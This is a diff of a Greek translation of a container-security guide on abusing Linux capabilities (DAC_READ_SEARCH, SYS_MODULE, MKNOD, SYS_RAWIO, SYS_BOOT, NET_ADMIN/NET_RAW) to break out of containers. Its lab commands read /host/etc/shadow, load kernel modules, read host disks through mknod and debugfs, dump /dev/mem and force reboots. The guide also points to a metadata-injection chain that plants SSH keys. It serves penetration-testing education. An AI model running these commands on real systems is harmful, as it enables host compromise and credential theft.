 findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
 stat -c 'owner=%u:%g mode=%A path=%n' \
-/host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
+  /host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
 find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
 ```
-**Δοκιμάστε τις παρακάμψεις ανάγνωσης και εγγραφής** σε ένα disposable lab:
+
+**Δοκιμάστε τις παρακάμψεις ανάγνωσης και εγγραφής** σε ένα προσωρινό εργαστήριο:
+
 ```bash
 head -n 1 /host/etc/shadow
 printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
 rm /host/root/ht-dac-proof
 ```
-Μια mount μόνο για ανάγνωση και οι κανόνες LSM εξακολουθούν να ισχύουν. Το `CAP_DAC_READ_SEARCH` εξουσιοδοτεί επίσης το `open_by_handle_at()`, αλλά ένα breakout όπως το Shocker χρειάζεται επιπλέον ένα file descriptor mount για το ίδιο υποκείμενο filesystem, έγκυρα ή discoverable handles, συμβατή διάταξη filesystem/storage και απουσία αποκλεισμού από το runtime ή το LSM. Δεν παρέχει αυθαίρετη πρόσβαση σε κάθε filesystem εκτός του mount namespace.
 
-### `CAP_SYS_MODULE`: εκτέλεση στον shared kernel
+Ένα mount μόνο για ανάγνωση και οι κανόνες LSM εξακολουθούν να ισχύουν. Το `CAP_DAC_READ_SEARCH` επιτρέπει επίσης τη χρήση του `open_by_handle_at()`, αλλά ένα breakout όπως το Shocker απαιτεί επιπλέον ένα file descriptor mount για το ίδιο υποκείμενο filesystem, έγκυρα ή εντοπίσιμα handles, συμβατή διάταξη filesystem/storage και να μην υπάρχει αποκλεισμός από το runtime ή το LSM. Δεν παρέχει αυθαίρετη πρόσβαση σε κάθε filesystem έξω από το mount namespace.
 
-Σε ένα συνηθισμένο Linux container, ένα αποδεκτό module εκτελείται στον shared host kernel.
+### `CAP_SYS_MODULE`: εκτέλεση στον κοινόχρηστο kernel
 
-**Έλεγξε το capability και το scope του user namespace:**
+Σε ένα συνηθισμένο Linux container, ένα αποδεκτό module εκτελείται στον κοινόχρηστο kernel του host.
+
+**Έλεγχος του capability και του πεδίου εφαρμογής του user namespace:**
+
 ```bash
 capsh --print | grep cap_sys_module
 grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
 cat /proc/self/uid_map
 ```
-**Απαριθμήστε τα προαπαιτούμενα για τη φόρτωση module:**
+
+**Απαριθμήστε τις προϋποθέσεις φόρτωσης modules:**
+
 ```bash
 uname -r
 cat /proc/sys/kernel/modules_disabled
 cat /sys/kernel/security/lockdown 2>/dev/null
 grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
-"/boot/config-$(uname -r)" 2>/dev/null
+  "/boot/config-$(uname -r)" 2>/dev/null
 modinfo /lab/ht-proof.ko
 ```
-**Εκμετάλλευση μόνο με συμβατό, εκ των προτέρων ελεγμένο proof module σε disposable node:**
+
+**Εκτελέστε exploit μόνο με συμβατό, προελεγμένο module απόδειξης σε αναλώσιμο node:**
+
 ```bash
 insmod /lab/ht-proof.ko
 grep '^ht_proof ' /proc/modules
 rmmod ht_proof
 ```
-Η capability πρέπει να είναι effective στο αρχικό user namespace. Η έκδοση και η διαμόρφωση του kernel, οι υπογραφές των modules, το lockdown, το seccomp και η πολιτική LSM πρέπει να επιτρέπουν το load. Τα Kata, gVisor, Hyper-V isolation και παρόμοια runtimes αλλάζουν το όριο του kernel στο οποίο φτάνει το workload.
+
+Η capability πρέπει να είναι ενεργή στο αρχικό user namespace. Η έκδοση και η ρύθμιση του kernel, οι υπογραφές των modules, το lockdown, το seccomp και η πολιτική LSM πρέπει να επιτρέπουν τη φόρτωση. Τα Kata, gVisor, Hyper-V isolation και παρόμοια runtimes αλλάζουν το όριο kernel στο οποίο φτάνει το workload.
 
 ### `CAP_MKNOD`: δημιουργία επιτρεπόμενου device handle
 
-Η `CAP_MKNOD` δημιουργεί ένα device node, αλλά δεν παρακάμπτει το device cgroup. Η δημιουργία device δεν είναι namespaced, επομένως η capability πρέπει να είναι effective στο αρχικό user namespace.
+Το `CAP_MKNOD` δημιουργεί ένα device node, αλλά δεν παρακάμπτει το device cgroup. Η δημιουργία συσκευών δεν είναι namespaced, επομένως η capability πρέπει να είναι ενεργή στο αρχικό user namespace.
 
 **Έλεγχος της capability και του scope του user namespace:**
+
 ```bash
 capsh --print | grep cap_mknod
 grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
 cat /proc/self/uid_map
 ```
-**Κατάγραψε τις πραγματικές συσκευές, τους major/minor αριθμούς τους και οποιαδήποτε ορατή cgroup-v1 allowlist:**
+
+**Καταγράψτε τις πραγματικές συσκευές, τους αριθμούς major/minor και τυχόν ορατή allowlist του cgroup-v1:**
+
 ```bash
 lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
 for device_file in /sys/class/block/*/dev; do
-printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
+  printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
 done
 cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
 ```
-**Exploit ενός επικυρωμένου υποψηφίου ext-family μόνο για ανάγνωση:**
+
+**Exploit ενός επικυρωμένου υποψηφίου της οικογένειας ext σε λειτουργία μόνο για ανάγνωση:**
+
 ```bash
 node_block_name=vda1                       # Replace with the validated candidate.
 device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
@@ -241,77 +284,95 @@ mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
 debugfs -R 'cat /etc/hostname' /dev/ht-node-root
 rm /dev/ht-node-root
 ```
-Άλλα filesystems χρειάζονται ένα αντίστοιχο εργαλείο μόνο για ανάγνωση· η προσάρτηση της συσκευής απαιτεί επιπλέον `CAP_SYS_ADMIN`. Το `Operation not permitted` κατά το άνοιγμα του δημιουργημένου node συνήθως υποδεικνύει ότι το device cgroup εξακολουθεί να το αποκλείει. Υπό το cgroup v2, η πρόσβαση σε συσκευές επιβάλλεται συνήθως με BPF και δεν υπάρχει αρχείο `devices.list`, επομένως ένα επιτυχές open είναι η καθοριστική δοκιμή.
 
-### `CAP_SYS_RAWIO`: εκτεθειμένο raw-I/O interface
+Άλλα filesystems χρειάζονται ένα αντίστοιχο read-only εργαλείο· για την προσάρτηση της συσκευής απαιτείται επίσης `CAP_SYS_ADMIN`. Το `Operation not permitted` κατά το άνοιγμα του κόμβου που δημιουργήθηκε συνήθως υποδεικνύει ότι το device cgroup εξακολουθεί να αποκλείει την πρόσβαση. Στο cgroup v2, η πρόσβαση στις συσκευές επιβάλλεται συνήθως μέσω BPF και δεν υπάρχει αρχείο `devices.list`, επομένως το επιτυχές άνοιγμα είναι η καθοριστική δοκιμή.
 
-Δεν υπάρχει portable generic payload: οι έγκυρες διευθύνσεις και τα effects εξαρτώνται από το hardware και τη ρύθμιση του kernel.
+### `CAP_SYS_RAWIO`: εκτεθειμένη διεπαφή raw-I/O
 
-**Έλεγχος του capability και του scope του user namespace:**
+Δεν υπάρχει φορητό, γενικής χρήσης payload: οι έγκυρες διευθύνσεις και τα αποτελέσματα εξαρτώνται από το υλικό και τη διαμόρφωση του kernel.
+
+**Ελέγξτε το capability και το εύρος του user namespace:**
+
 ```bash
 capsh --print | grep cap_sys_rawio
 grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
 cat /proc/self/uid_map
 ```
-**Απαριθμήστε τις εκτεθειμένες raw διεπαφές, το hardware και τα drivers:**
+
+**Καταγράψτε τις εκτεθειμένες ακατέργαστες διεπαφές, το υλικό και τα προγράμματα οδήγησης:**
+
 ```bash
 ls -l /dev/mem /dev/port 2>/dev/null
 lspci -nnk 2>/dev/null
 find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
 ```
-**Exploit μόνο με εγκεκριμένο proof για την αναγνωρισμένη συσκευή και το εύρος διευθύνσεων.** Αν το `/dev/mem` είναι η εγκεκριμένη από το εργαστήριο διεπαφή, αυτό το template αποδεικνύει την αποκάλυψη μνήμης node χωρίς να εκτυπώνει τα περιεχόμενά της:
+
+**Κάντε exploit μόνο με εγκεκριμένη απόδειξη για την ταυτοποιημένη συσκευή και το εύρος διευθύνσεων.** Αν το `/dev/mem` είναι η εγκεκριμένη διεπαφή για το εργαστήριο, αυτό το πρότυπο αποδεικνύει την αποκάλυψη μνήμης κόμβου χωρίς να εκτυπώνει τα περιεχόμενά της:
+
 ```bash
 approved_physical_address=<lab-provided-decimal-address>
 approved_byte_count=<lab-provided-size>
 dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
-skip="${approved_physical_address}" count="${approved_byte_count}" status=none
+  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
 wc -c /tmp/ht-rawio-proof.bin
 sha256sum /tmp/ht-rawio-proof.bin
 rm /tmp/ht-rawio-proof.bin
 ```
-Η διεύθυνση πρέπει να προέρχεται από το hardware map του lab, επειδή η ανάγνωση ορισμένων περιοχών MMIO μπορεί να έχει side effects. Μια generic εντολή memory-write θα ήταν παραπλανητική και μη ασφαλής: η ίδια διεύθυνση μπορεί να είναι ακίνδυνη σε ένα μηχάνημα και να ελέγχει hardware ή kernel memory σε ένα άλλο. Τα device cgroups, τα filesystem permissions, το αυστηρό `/dev/mem`, το kernel lockdown, το virtualization και η πολιτική LSM συνήθως εμποδίζουν την πρόσβαση που θα ήταν χρήσιμη.
 
-### `CAP_SYS_BOOT`: reboot του namespace ή αντικατάσταση του kernel
+Η διεύθυνση πρέπει να προέρχεται από τον χάρτη υλικού του lab, επειδή η ανάγνωση ορισμένων περιοχών MMIO μπορεί να έχει παρενέργειες. Μια γενική εντολή εγγραφής μνήμης θα ήταν παραπλανητική και μη ασφαλής: η ίδια διεύθυνση μπορεί να είναι ακίνδυνη σε ένα μηχάνημα και να ελέγχει υλικό ή μνήμη του kernel σε άλλο. Τα device cgroups, τα δικαιώματα filesystem, η αυστηρή ρύθμιση του `/dev/mem`, το kernel lockdown, η εικονικοποίηση και οι πολιτικές LSM συχνά εμποδίζουν την ουσιαστική πρόσβαση.
 
-Σε ένα private PID namespace, το `reboot()` τερματίζει τη διεργασία init αυτού του namespace αντί να κάνει reboot στον host. Επομένως, για να επηρεαστεί το reboot του host απαιτείται το αρχικό PID namespace, συνήθως μέσω host PID sharing. Μια διαδρομή kexec απαιτεί επίσης ένα συμβατό kernel image και permissive πολιτική lockdown/signature:
+### `CAP_SYS_BOOT`: επανεκκίνηση namespace ή αντικατάσταση kernel
 
-**Έλεγχος του capability:**
+Σε ένα ιδιωτικό PID namespace, η `reboot()` τερματίζει τη διεργασία init αυτού του namespace αντί να επανεκκινεί το host. Επομένως, για να επηρεαστεί η επανεκκίνηση του host, απαιτείται το αρχικό PID namespace, συνήθως μέσω κοινής χρήσης του host PID. Μια διαδρομή kexec απαιτεί επίσης συμβατή εικόνα kernel και επιτρεπτική πολιτική lockdown/υπογραφών:
+
+**Έλεγχος της δυνατότητας:**
+
 ```bash
 capsh --print | grep cap_sys_boot
 grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
 cat /proc/self/uid_map
 ```
-**Καταγράψτε τις προϋποθέσεις του PID namespace και του kexec:** επιβεβαιώστε την κοινή χρήση των PID του host από τη ρύθμιση του workload, επειδή ένας σύνδεσμος προς ένα PID namespace από μόνος του δεν αποκαλύπτει αν πρόκειται για το αρχικό namespace του node.
+
+**Καταγράψτε τις προϋποθέσεις για PID-namespace και kexec:** επιβεβαιώστε την κοινή χρήση PID του host από τη διαμόρφωση του workload, επειδή ένας σύνδεσμος προς PID namespace από μόνος του δεν αποκαλύπτει αν πρόκειται για το αρχικό namespace του node.
+
 ```bash
 ps -p 1 -o pid,user,comm,args
 readlink /proc/self/ns/pid
 command -v kexec 2>/dev/null
 cat /sys/kernel/security/lockdown 2>/dev/null
 ```
-**Εκτελέστε exploit μόνο όταν η επανεκκίνηση ενός αναλώσιμου lab node αποτελεί ρητή άσκηση:**
+
+**Εκτέλεσε exploit μόνο όταν η επανεκκίνηση ενός αναλώσιμου κόμβου εργαστηρίου αποτελεί τη ρητή άσκηση:**
+
 ```bash
 sync
 reboot -f
 ```
-Μην εκτελέσετε αυτή την εντολή και μην φορτώσετε kernel σε shared node απλώς για να αποδείξετε την capability. Σε ένα private PID namespace τερματίζει μόνο το init process του συγκεκριμένου namespace και δεν αποδεικνύει επίδραση στο host.
+
+Μην εκτελέσετε αυτήν την εντολή και μην φορτώσετε kernel σε κοινόχρηστο node μόνο και μόνο για να αποδείξετε την capability. Σε ένα ιδιωτικό PID namespace, τερματίζει μόνο τη διεργασία init αυτού του namespace και δεν αποδεικνύει επίδραση στο host.
 
 ### `CAP_NET_ADMIN` και `CAP_NET_RAW`: διαδρομές δικτύου του host
 
 Η `CAP_NET_ADMIN` επηρεάζει μόνο το τρέχον network namespace.
 
-**Ελέγξτε τις capabilities και τον περιορισμό:**
+**Ελέγξτε τις capabilities και τον περιορισμό πρόσβασης:**
+
 ```bash
 capsh --print | grep -E 'cap_net_admin|cap_net_raw'
 grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
 ```
+
 **Απαριθμήστε το τρέχον δίκτυο και επιβεβαιώστε τη δικτύωση host από τη διαμόρφωση του workload:**
+
 ```bash
 readlink /proc/self/ns/net
 ip -brief address
 ip route
 nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
 ```
-**Άσκηση `CAP_NET_ADMIN` με αναστρέψιμο τρόπο:** με host networking, το προσωρινό interface είναι interface του node.
+
+**Δοκιμάστε το `CAP_NET_ADMIN` με αναστρέψιμο τρόπο:** με host networking, η προσωρινή διεπαφή είναι διεπαφή του κόμβου.
+
 ```bash
 ip link add ht-net-admin-proof type dummy
 ip addr add 192.0.2.1/32 dev ht-net-admin-proof
@@ -319,45 +380,59 @@ ip link set ht-net-admin-proof up
 ip -brief addr show ht-net-admin-proof
 ip link delete ht-net-admin-proof
 ```
-`CAP_NET_RAW` επιτρέπει RAW και PACKET sockets, αλλά δεν παρέχει ένα γενικό host shell. Για να **καταγράψετε** την τεκμηριωμένη αλυσίδα GCE, ελέγξτε τη διαδρομή metadata και καταγράψτε αν είναι παρατηρήσιμη η plaintext κίνηση του guest-agent:
+
+`CAP_NET_RAW` επιτρέπει RAW και PACKET sockets, αλλά δεν παρέχει ένα γενικό κέλυφος στο host. Για να **καταγράψετε** την τεκμηριωμένη αλυσίδα GCE, ελέγξτε τη διαδρομή metadata και καταγράψτε αν είναι παρατηρήσιμη η κίνηση guest-agent σε plaintext:
+
 ```bash
 ip route get 169.254.169.254
 tcpdump -ni any -c 20 'host 169.254.169.254'
 ```
-Αν υπάρχουν οι αντίστοιχες προϋποθέσεις, **exploit** το environment-specific chain όπως τεκμηριώνεται στο [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): κάνε capture το request και το sequence state, κάνε inject το forged metadata response που περιέχει ένα SSH key και, στη συνέχεια, κάνε validate την πρόσβαση στο host. Το chain απαιτούσε root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, plaintext GCE metadata traffic και ένα raceable guest-agent request· η σύγχρονη συμπεριφορά του transport ή του agent μπορεί να το διακόψει.
+
+Αν υπάρχουν οι αντίστοιχες προϋποθέσεις, **εκμεταλλεύσου** την αλυσίδα που εξαρτάται από το περιβάλλον, όπως περιγράφεται στο [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): κατέγραψε το αίτημα και την κατάσταση της ακολουθίας, εισήγαγε την πλαστογραφημένη απόκριση metadata που περιέχει ένα SSH key και, στη συνέχεια, επαλήθευσε την πρόσβαση στο host. Η αλυσίδα απαιτούσε root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, μη κρυπτογραφημένη κίνηση προς τα GCE metadata και ένα αίτημα guest-agent που μπορούσε να αποτελέσει αντικείμενο race condition· σύγχρονα πρωτόκολλα μεταφοράς ή συμπεριφορά agent μπορεί να την εμποδίσουν.
+
+### Περιορισμοί τοπικής προέλευσης και διευθύνσεις διεπαφών
+
+Ένας listener μπορεί να απορρίπτει συνδέσεις με διεύθυνση προέλευσης `127.0.0.1`, αλλά να παραβλέπει μια άλλη διεύθυνση που έχει εκχωρηθεί στο ίδιο network namespace. Αν ο listener είναι προσβάσιμος από εκείνη τη διεπαφή, σύγκρινε μια σύνδεση loopback με μία που δεσμεύεται σε υπάρχουσα μη loopback τοπική διεύθυνση. Το `CAP_NET_ADMIN` μπορεί να επιτρέπει τη ρύθμιση διεπαφών στο τρέχον namespace, αλλά δεν χρειάζεται αν έχει ήδη εκχωρηθεί κατάλληλη διεύθυνση. Το `CAP_NET_RAW` δεν αποτελεί προϋπόθεση για μια συνηθισμένη σύνδεση TCP. Πρόκειται για αστοχία ταξινόμησης διεύθυνσης προέλευσης, όχι για διαφυγή από container ούτε για απόδειξη ότι η εφαρμογή θα εξουσιοδοτήσει ένα προνομιούχο αίτημα.<sup>[[1]](#references)[[7]](#references)</sup>
+
+Για έναν WebSocket listener, μια έγκυρη απόκριση HTTP `101 Switching Protocols` επιβεβαιώνει ότι ολοκληρώθηκε το handshake έναρξης· ένα επακόλουθο σφάλμα σε επίπεδο εφαρμογής μπορεί να δείχνει ότι η σύνδεση έφτασε στον handler. Καμία από τις δύο αποκρίσεις δεν αποδεικνύει ότι ο έλεγχος ταυτότητας ή η ζητούμενη λειτουργία ολοκληρώθηκε με επιτυχία.<sup>[[8]](#references)</sup>
 
 ## Έλεγχοι
 
-Ο στόχος των capability checks δεν είναι μόνο η εξαγωγή raw τιμών, αλλά η κατανόηση του αν το process έχει αρκετά privileges ώστε να καταστήσει επικίνδυνη την τρέχουσα namespace και mount κατάστασή του.
+Σκοπός των ελέγχων capabilities δεν είναι μόνο η εμφάνιση ακατέργαστων τιμών, αλλά και η κατανόηση του κατά πόσο η διεργασία έχει αρκετά προνόμια ώστε η τρέχουσα κατάσταση namespace και mount να είναι επικίνδυνη.
+
 ```bash
 capsh --print                    # Human-readable capability sets and securebits
 grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
 ```
+
 Τι είναι ενδιαφέρον εδώ:
 
-- Το `capsh --print` είναι ο ευκολότερος τρόπος για να εντοπίσετε capabilities υψηλού κινδύνου, όπως `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` ή `cap_sys_module`.
-- Η γραμμή `CapEff` στο `/proc/self/status` σας δείχνει τι είναι πραγματικά effective τώρα, όχι απλώς τι μπορεί να είναι διαθέσιμο σε άλλα sets.
-- Ένα capability dump γίνεται πολύ πιο σημαντικό αν το container μοιράζεται επίσης τα host PID, network ή user namespaces ή διαθέτει writable host mounts.
+- Το `capsh --print` είναι ο ευκολότερος τρόπος να εντοπίσετε capabilities υψηλού κινδύνου, όπως `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` ή `cap_sys_module`.
+- Η γραμμή `CapEff` στο `/proc/self/status` δείχνει ποιες capabilities είναι πραγματικά ενεργές τώρα, όχι απλώς ποιες μπορεί να είναι διαθέσιμες σε άλλα sets.
+- Η καταγραφή των capabilities αποκτά πολύ μεγαλύτερη σημασία αν το container μοιράζεται επίσης τα host PID, network ή user namespaces, ή έχει εγγράψιμα host mounts.
 
-Μετά τη συλλογή των raw capability πληροφοριών, το επόμενο βήμα είναι η ερμηνεία τους. Εξετάστε αν η διεργασία είναι root, αν είναι ενεργά τα user namespaces, αν μοιράζονται host namespaces, αν το seccomp εφαρμόζεται και αν το AppArmor ή το SELinux εξακολουθεί να περιορίζει τη διεργασία. Ένα capability set από μόνο του αποτελεί μόνο μέρος της εικόνας, αλλά συχνά είναι το μέρος που εξηγεί γιατί ένα container breakout λειτουργεί, ενώ ένα άλλο αποτυγχάνει με το ίδιο φαινομενικό σημείο εκκίνησης.
+Αφού συλλέξετε τις ακατέργαστες πληροφορίες για τα capabilities, το επόμενο βήμα είναι η ερμηνεία τους. Εξετάστε αν η διεργασία είναι root, αν είναι ενεργά τα user namespaces, αν γίνεται κοινή χρήση των host namespaces, αν το seccomp επιβάλλεται και αν το AppArmor ή το SELinux εξακολουθούν να περιορίζουν τη διεργασία. Το σύνολο των capabilities από μόνο του αποτελεί μόνο μέρος της εικόνας, αλλά συχνά εξηγεί γιατί λειτουργεί ένα container breakout και ένα άλλο αποτυγχάνει, παρότι φαίνεται να ξεκινούν από την ίδια κατάσταση.
 
 ## Προεπιλογές Runtime
 
-| Runtime / platform | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνήθης χειροκίνητη αποδυνάμωση |
+| Runtime / πλατφόρμα | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνήθεις χειροκίνητες αποδυναμώσεις |
 | --- | --- | --- | --- |
-| Docker Engine | Μειωμένο capability set από προεπιλογή | Το Docker διατηρεί μια προεπιλεγμένη allowlist capabilities και αφαιρεί τις υπόλοιπες | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
-| Podman | Μειωμένο capability set από προεπιλογή | Τα Podman containers είναι unprivileged από προεπιλογή και χρησιμοποιούν ένα μειωμένο capability model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
-| Kubernetes | Κληρονομεί τις προεπιλογές του runtime, εκτός αν αλλάξουν | Αν δεν καθοριστούν `securityContext.capabilities`, το container λαμβάνει το προεπιλεγμένο capability set του runtime | `securityContext.capabilities.add`, αποτυχία χρήσης του `drop: [\"ALL\"]`, `privileged: true` |
-| containerd / CRI-O under Kubernetes | Συνήθως η προεπιλογή του runtime | Το effective set εξαρτάται από το runtime και το Pod spec | ίδιο με τη γραμμή του Kubernetes· η άμεση OCI/CRI configuration μπορεί επίσης να προσθέσει capabilities ρητά |
+| Docker Engine | Περιορισμένο σύνολο capabilities από προεπιλογή | Το Docker διατηρεί μια προεπιλεγμένη λίστα επιτρεπόμενων capabilities και αφαιρεί τις υπόλοιπες | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
+| Podman | Περιορισμένο σύνολο capabilities από προεπιλογή | Τα containers του Podman δεν είναι προνομιούχα από προεπιλογή και χρησιμοποιούν ένα περιορισμένο μοντέλο capabilities | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
+| Kubernetes | Κληρονομεί τις προεπιλογές του runtime, εκτός αν αλλάξουν | Αν δεν καθοριστούν `securityContext.capabilities`, το container λαμβάνει το προεπιλεγμένο σύνολο capabilities του runtime | `securityContext.capabilities.add`, παράλειψη του `drop: [\"ALL\"]`, `privileged: true` |
+| containerd / CRI-O υπό Kubernetes | Συνήθως η προεπιλογή του runtime | Το ενεργό σύνολο εξαρτάται από το runtime και τις προδιαγραφές του Pod | Όπως στη γραμμή του Kubernetes· η άμεση διαμόρφωση OCI/CRI μπορεί επίσης να προσθέσει capabilities ρητά |
 
-Για το Kubernetes, το σημαντικό σημείο είναι ότι το API δεν ορίζει ένα ενιαίο καθολικό προεπιλεγμένο capability set. Αν το Pod δεν προσθέτει ή αφαιρεί capabilities, το workload κληρονομεί την προεπιλογή του runtime για το συγκεκριμένο node.
+Για το Kubernetes, το σημαντικό είναι ότι το API δεν ορίζει ένα καθολικό προεπιλεγμένο σύνολο capabilities. Αν το Pod δεν προσθέσει ή αφαιρέσει capabilities, το workload κληρονομεί την προεπιλογή του runtime για εκείνον τον κόμβο.
+
+{{#include ../../../../banners/hacktricks-training.md}}
 
 ## References
 
 - [1] [capabilities(7) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
 - [2] [Open Container Initiative - Διαμόρφωση Linux container](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
-- [3] [Docker Docs - Runtime privilege και Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
-- [4] [Kubernetes Documentation - Ορισμός capabilities για ένα container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
-- [5] [Podman documentation - `--cap-add` και `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
-- [6] [Incus documentation - Ασφάλεια](https://linuxcontainers.org/incus/docs/main/explanation/security/)
-{{#include ../../../../banners/hacktricks-training.md}}
+- [3] [Docker Docs - Προνόμια runtime και Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
+- [4] [Τεκμηρίωση Kubernetes - Ορισμός capabilities για ένα container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
+- [5] [Τεκμηρίωση Podman - `--cap-add` και `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
+- [6] [Τεκμηρίωση Incus - Ασφάλεια](https://linuxcontainers.org/incus/docs/main/explanation/security/)
+- [7] [ip(7) - Υλοποίηση πρωτοκόλλου Linux IPv4](https://man7.org/linux/man-pages/man7/ip.7.html)
+- [8] [RFC 6455 - Το πρωτόκολλο WebSocket](https://www.rfc-editor.org/rfc/rfc6455.html)
